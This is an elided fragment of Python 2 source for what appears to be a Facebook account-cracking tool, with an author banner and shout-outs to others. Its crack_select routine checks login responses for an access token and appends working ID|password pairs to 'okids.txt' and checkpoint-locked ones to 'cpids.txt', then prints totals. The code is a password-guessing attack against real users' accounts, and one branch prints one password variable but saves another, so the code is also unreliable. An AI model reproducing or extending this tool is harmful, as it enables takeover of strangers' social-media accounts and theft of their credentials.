...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Aamir Khan
\033[1;92mFb \033[1;93m: Aamir Khan
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[aizaz-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[aizaz-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks aizaz & Also naveed Bro
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
